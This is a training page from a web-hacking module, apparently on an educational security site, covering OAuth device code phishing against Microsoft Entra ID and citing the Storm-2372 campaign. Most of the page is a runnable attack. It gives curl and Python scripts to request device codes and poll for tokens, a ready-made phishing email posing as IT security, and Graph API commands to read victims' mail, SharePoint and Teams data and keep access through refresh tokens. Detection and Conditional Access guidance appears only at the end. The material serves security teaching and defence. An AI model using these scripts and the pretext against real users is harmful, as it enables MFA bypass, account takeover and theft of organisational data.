---
layout: training-page
title: "OAuth Device Code Phishing — Storm-2372 & MFA Bypass"
module: "Web Hacking"
tags:
  - oauth
  - device-code
  - phishing
  - microsoft
  - entra-id
  - storm-2372
  - mfa-bypass
  - graph-api
page_key: "web-oauth-device-code"
render_with_liquid: false
---

# OAuth Device Code Phishing

The OAuth 2.0 Device Authorization Grant (RFC 8628) was designed for devices without browsers — smart TVs, CLI tools, IoT devices. Attackers have repurposed it to bypass MFA entirely. The technique was used at scale by Storm-2372 (February 2025, attributed by Microsoft to a nation-state actor) against government agencies, NGOs, and defense organizations.

---

## How Device Code Flow Works (Legitimate)

```
# Step 1: Device requests a code pair from the authorization server
POST https://login.microsoftonline.com/common/oauth2/v2.0/devicecode
Content-Type: application/x-www-form-urlencoded

client_id=04b07795-8ddb-461a-bbee-02f9e1bf7b46   # Azure CLI client ID
&scope=https://graph.microsoft.com/.default

# Response:
{
  "device_code": "BAQABAAEAAAD...(long opaque string)",
  "user_code": "HNFKM9QZ",
  "verification_uri": "https://microsoft.com/devicelogin",
  "expires_in": 900,
  "interval": 5,
  "message": "To sign in, use a web browser to open https://microsoft.com/devicelogin and enter HNFKM9QZ"
}

# Step 2: User visits verification_uri on any browser, enters user_code, authenticates with MFA
# Step 3: Device polls the token endpoint every 5 seconds
POST https://login.microsoftonline.com/common/oauth2/v2.0/token
grant_type=urn:ietf:params:oauth:grant-type:device_code
&device_code=BAQABAAEAAAD...
&client_id=04b07795-8ddb-461a-bbee-02f9e1bf7b46

# When user approves: token endpoint returns access_token + refresh_token
```

---

## The Attack

The attacker initiates the device code request, then sends the `user_code` + `verification_uri` to the victim with a social engineering pretext. The victim completes authentication — including any MFA — on the *legitimate* Microsoft login page. The attacker's polling loop receives a full access token.

```
# Step 1: Attacker generates device code for a legitimate-looking app
curl -s -X POST "https://login.microsoftonline.com/common/oauth2/v2.0/devicecode" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "client_id=04b07795-8ddb-461a-bbee-02f9e1bf7b46&scope=https://graph.microsoft.com/.default openid profile"

# Parse user_code and device_code from response:
USER_CODE="HNFKM9QZ"
DEVICE_CODE="BAQABAAEAAAD..."

# Step 2: Send social engineering message to victim (Teams, email, SMS)
# Example pretext:
cat << 'EOF'
Subject: [IT Security] Device verification required

Your account requires device re-verification to comply with the new security policy.

1. Open https://microsoft.com/devicelogin
2. Enter verification code: HNFKM9QZ
3. Approve the sign-in request

This verification expires in 15 minutes. If you did not request this, contact the help desk.

— IT Security Team
EOF

# Step 3: Attacker polls for token (every 5 seconds, up to 15 minutes)
while true; do
  RESPONSE=$(curl -s -X POST "https://login.microsoftonline.com/common/oauth2/v2.0/token" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d "grant_type=urn:ietf:params:oauth:grant-type:device_code&device_code=${DEVICE_CODE}&client_id=04b07795-8ddb-461a-bbee-02f9e1bf7b46")
  
  if echo "$RESPONSE" | grep -q "access_token"; then
    echo "$RESPONSE" | python3 -m json.tool
    break
  fi
  sleep 5
done
```

---

## Storm-2372 Case Study (February 2025)

Microsoft Threat Intelligence identified sustained device code phishing campaigns targeting:
- Government ministries
- Defense contractors
- NGOs and think tanks
- Energy sector companies

**TTPs:**
- Initial contact via Microsoft Teams messages (some from compromised accounts)
- Device code phishing pretext: "security verification required"
- Target app: legitimate Microsoft 365 apps (Teams, Office)
- Obtained refresh tokens valid for 90 days
- Used tokens for MS Graph API access: SharePoint document exfil, Outlook email access, Teams message reading
- Pivoted within tenants using captured tokens to access further resources

---

## Post-Exploitation with Captured Tokens

```
# Enumerate user info:
curl -s "https://graph.microsoft.com/v1.0/me" \
  -H "Authorization: Bearer $ACCESS_TOKEN" | jq .

# List SharePoint sites:
curl -s "https://graph.microsoft.com/v1.0/sites" \
  -H "Authorization: Bearer $ACCESS_TOKEN" | jq '.value[].webUrl'

# Read Outlook mail:
curl -s "https://graph.microsoft.com/v1.0/me/messages?\$top=20&\$select=subject,from,receivedDateTime" \
  -H "Authorization: Bearer $ACCESS_TOKEN" | jq '.value[] | .subject, .from.emailAddress.address'

# List Teams channels and messages:
curl -s "https://graph.microsoft.com/v1.0/me/joinedTeams" \
  -H "Authorization: Bearer $ACCESS_TOKEN" | jq '.value[].displayName'

# Refresh token — use for persistent access (90-day lifetime):
curl -s -X POST "https://login.microsoftonline.com/common/oauth2/v2.0/token" \
  -d "grant_type=refresh_token&refresh_token=$REFRESH_TOKEN&client_id=04b07795-8ddb-461a-bbee-02f9e1bf7b46&scope=https://graph.microsoft.com/.default"
```

---

## Tools

```
# AADInternals (PowerShell):
Import-Module AADInternals
Invoke-AADIntDeviceCodeLogin -Resource "https://graph.microsoft.com"
# Follow prompt, send user_code to target, receive tokens automatically

# ROADtools — device code module:
roadrecon auth --device-code
# Opens polling loop, enumerate once token received:
roadrecon gather

# TokenSmith — multi-tenant device code automation:
# github.com/f-bader/TokenSmith

# Python one-liner polling loop:
python3 -c "
import requests, time, json, sys
dc = sys.argv[1]  # device_code
while True:
    r = requests.post('https://login.microsoftonline.com/common/oauth2/v2.0/token',
        data={'grant_type':'urn:ietf:params:oauth:grant-type:device_code',
              'device_code':dc, 'client_id':'04b07795-8ddb-461a-bbee-02f9e1bf7b46'})
    if 'access_token' in r.text:
        print(json.dumps(r.json(), indent=2)); break
    time.sleep(5)
" "$DEVICE_CODE"
```

---

## Detection & Defense

```
# Defender: Conditional Access policy to block device code flow
# Azure Portal → Entra ID → Security → Conditional Access → New Policy
# Cloud apps: All cloud apps
# Grant: Block access
# Conditions → Authentication flows → Device code flow: Yes

# Detection in Entra ID sign-in logs:
# Authentication method: "Device Code" in the sign-in log entry
# Alert on device code authentications from:
# - First-seen user agents
# - IP addresses in threat intel feeds
# - Outside business hours

# PowerShell detection query (KQL for Sentinel):
# SigninLogs
# | where AuthenticationProtocol == "deviceCode"
# | where ResultType == 0
# | where IPAddress !in (trusted_ip_list)
```

---

## Resources

- Microsoft MSTIC — Storm-2372 device code phishing campaign: `microsoft.com/en-us/security/blog/2025/02/13/...`
- RFC 8628 — OAuth 2.0 Device Authorization Grant: `rfc-editor.org/rfc/rfc8628`
- AADInternals — `github.com/Gerenios/AADInternals`
- ROADtools — `github.com/dirkjanm/ROADtools`
- TokenSmith — `github.com/f-bader/TokenSmith`
- Microsoft Graph API reference — `learn.microsoft.com/en-us/graph/api/overview`
